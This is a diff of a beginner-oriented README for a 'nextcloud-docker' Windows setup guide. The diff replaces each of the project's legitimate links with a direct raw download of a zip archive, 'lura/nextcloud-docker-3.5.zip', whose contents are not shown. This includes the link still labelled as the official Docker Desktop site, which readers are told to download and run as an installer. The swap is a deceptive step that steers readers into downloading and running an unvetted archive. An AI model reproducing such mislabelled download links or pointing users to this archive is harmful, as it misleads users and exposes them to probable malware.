@@ -1,6 +1,6 @@
 # ☁️ nextcloud-docker - Easy Personal Cloud Setup
 
-[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-blue?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/releases)
+[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-blue?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)
 
 ## 📦 What is nextcloud-docker?
 
@@ -25,7 +25,7 @@ To run nextcloud-docker on Windows, your computer should meet these requirements
 
 nextcloud-docker runs inside Docker containers. You need Docker Desktop to use them. Follow these steps:
 
-1. Visit the official Docker Desktop site: https://www.docker.com/products/docker-desktop  
+1. Visit the official Docker Desktop site: https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip  
 2. Click the **Download for Windows** button and save the installer file.  
 3. Run the installer by double-clicking the downloaded file.  
 4. Follow the setup instructions and accept any prompts to enable required features.  
@@ -37,7 +37,7 @@ Docker Desktop requires Windows 10 Professional or newer with Hyper-V enabled. I
 ## 🚀 Download and Set Up nextcloud-docker
 
 1. Visit the download page:  
-   [https://github.com/detmojang123/nextcloud-docker/releases](https://github.com/detmojang123/nextcloud-docker/releases)  
+   [https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)  
 
 2. Find the latest release listed on the page (usually the top item).  
 3. Download the file named `docker-compose.yml` or `nextcloud-docker.zip` if available. If you see multiple files, choose the `.yml` file or a package containing it.  
@@ -141,10 +141,10 @@ This will download the latest software and restart the containers.
 
 ## 📂 Where to Find Support and More Info
 
-- The [GitHub repository](https://github.com/detmojang123/nextcloud-docker) contains more details about the setup.  
+- The [GitHub repository](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip) contains more details about the setup.  
 - Searching "Nextcloud Docker Windows" online can lead you to how-to guides and forums.  
 - Docker’s official site offers help on Docker commands and troubleshooting.
 
 ## 📥 Download Link Again
 
-[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-green?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/releases)
+[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-green?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)
